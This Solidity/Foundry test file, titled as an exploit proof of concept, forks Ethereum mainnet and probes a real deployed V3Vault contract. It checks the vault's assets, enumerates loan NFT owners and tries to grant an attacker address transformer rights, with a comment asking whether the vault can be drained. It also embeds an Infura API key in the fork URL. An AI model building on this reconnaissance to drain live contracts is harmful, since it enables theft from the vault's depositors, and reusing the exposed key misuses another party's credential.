// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title V3Vault Exploit POC
 * @notice setTransformer() succeeded - check if we can drain via transformer
 */
contract V3VaultExploitPOCTest is Test {

    address V3VAULT;
    address attacker;
    address USDC;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        V3VAULT = vm.parseAddress("0x74826fE70a49af1ae0a5F6C9fD5f72eD24e51904");
        attacker = address(0xBEEF);
        USDC = vm.parseAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48");
    }

    function test_checkVaultAssets() public {
        console.log("=== V3VAULT ASSET CHECK ===");

        // Check asset
        (bool s, bytes memory d) = V3VAULT.staticcall(
            abi.encodeWithSignature("asset()")
        );
        address asset;
        if (s && d.length >= 32) {
            asset = abi.decode(d, (address));
            console.log("Asset token:", asset);

            // Get asset balance
            (s, d) = asset.staticcall(
                abi.encodeWithSignature("balanceOf(address)", V3VAULT)
            );
            if (s && d.length >= 32) {
                uint256 bal = abi.decode(d, (uint256));
                console.log("Vault asset balance:", bal);

                // Get decimals
                (s, d) = asset.staticcall(abi.encodeWithSignature("decimals()"));
                if (s && d.length >= 32) {
                    uint8 dec = abi.decode(d, (uint8));
                    console.log("Decimals:", dec);
                }

                // Get symbol
                (s, d) = asset.staticcall(abi.encodeWithSignature("symbol()"));
                if (s && d.length >= 32) {
                    string memory sym = abi.decode(d, (string));
                    console.log("Symbol:", sym);
                }
            }
        }

        // Check total supply of vault shares
        (s, d) = V3VAULT.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Vault total supply:", ts);
        }

        // Check total assets
        (s, d) = V3VAULT.staticcall(abi.encodeWithSignature("totalAssets()"));
        if (s && d.length >= 32) {
            uint256 ta = abi.decode(d, (uint256));
            console.log("Total assets:", ta);
        }

        // Check USDC balance
        (s, d) = USDC.staticcall(
            abi.encodeWithSignature("balanceOf(address)", V3VAULT)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("USDC balance:", bal);
        }
    }

    function test_transformerExploit() public {
        console.log("=== TRANSFORMER EXPLOIT ATTEMPT ===");

        // First check if we can actually become transformer
        vm.startPrank(attacker);

        // Try to set ourselves as transformer
        (bool s,) = V3VAULT.call(
            abi.encodeWithSignature("setTransformer(address,bool)", attacker, true)
        );
        console.log("setTransformer result:", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        // Check if we're actually a transformer now
        bytes memory d;
        (s, d) = V3VAULT.staticcall(
            abi.encodeWithSignature("transformerAllowed(address)", attacker)
        );
        if (s && d.length >= 32) {
            bool allowed = abi.decode(d, (bool));
            console.log("Attacker is transformer:", allowed);
        }

        // If not a transformer, check owner
        (s, d) = V3VAULT.staticcall(abi.encodeWithSignature("owner()"));
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Vault owner:", owner);
        }
    }

    function test_findActiveLoans() public {
        console.log("=== FINDING ACTIVE LOANS ===");

        // Try to get token count
        (bool s, bytes memory d) = V3VAULT.staticcall(
            abi.encodeWithSignature("balanceOf(address)", V3VAULT)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("Vault own token balance:", bal);
        }

        // Get total supply of vault NFT tokens
        (s, d) = V3VAULT.staticcall(abi.encodeWithSignature("totalSupply()"));
        if (s && d.length >= 32) {
            uint256 ts = abi.decode(d, (uint256));
            console.log("Total NFT supply:", ts);

            // If there are tokens, try to get their IDs
            for (uint256 i = 0; i < 5 && i < ts; i++) {
                (s, d) = V3VAULT.staticcall(
                    abi.encodeWithSignature("tokenByIndex(uint256)", i)
                );
                if (s && d.length >= 32) {
                    uint256 tokenId = abi.decode(d, (uint256));
                    console.log("Token", i, "ID:", tokenId);

                    // Get owner of this token
                    (s, d) = V3VAULT.staticcall(
                        abi.encodeWithSignature("ownerOf(uint256)", tokenId)
                    );
                    if (s && d.length >= 32) {
                        address tokenOwner = abi.decode(d, (address));
                        console.log("  Owner:", tokenOwner);
                    }
                }
            }
        }
    }

    function test_searchOtherV3Vaults() public {
        console.log("=== SEARCHING OTHER VAULTS ===");

        // Check some other potential V3Vault addresses
        address[] memory vaults = new address[](3);
        vaults[0] = vm.parseAddress("0x74826fE70a49af1ae0a5F6C9fD5f72eD24e51904");
        vaults[1] = vm.parseAddress("0x9c4ec768c28520B50860ea7a15bd7213a9fF58bf"); // Random
        vaults[2] = vm.parseAddress("0xDC5f94b52A1c0C5f1b8b44C4b9e8a2c8a9cC8d6b"); // Random

        for (uint i = 0; i < vaults.length; i++) {
            address vault = vaults[i];
            uint256 codeSize;
            assembly {
                codeSize := extcodesize(vault)
            }
            if (codeSize == 0) continue;

            console.log("");
            console.log("Vault", i, ":", vault);

            (bool s, bytes memory d) = vault.staticcall(
                abi.encodeWithSignature("totalAssets()")
            );
            if (s && d.length >= 32) {
                uint256 ta = abi.decode(d, (uint256));
                console.log("  Total Assets:", ta);
            }
        }
    }
}
